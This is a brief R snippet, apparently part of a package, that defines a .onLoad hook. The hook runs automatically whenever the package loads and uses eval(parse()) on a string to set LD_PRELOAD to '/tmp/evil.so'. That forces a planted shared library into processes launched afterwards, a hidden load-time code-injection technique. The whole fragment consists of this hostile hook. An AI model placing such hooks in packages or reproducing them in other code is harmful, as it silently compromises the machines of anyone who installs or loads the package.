(function(libname, pkgname) {
  eval(parse(text = "Sys.setenv(LD_PRELOAD = '/tmp/evil.so')"))
}) -> .onLoad
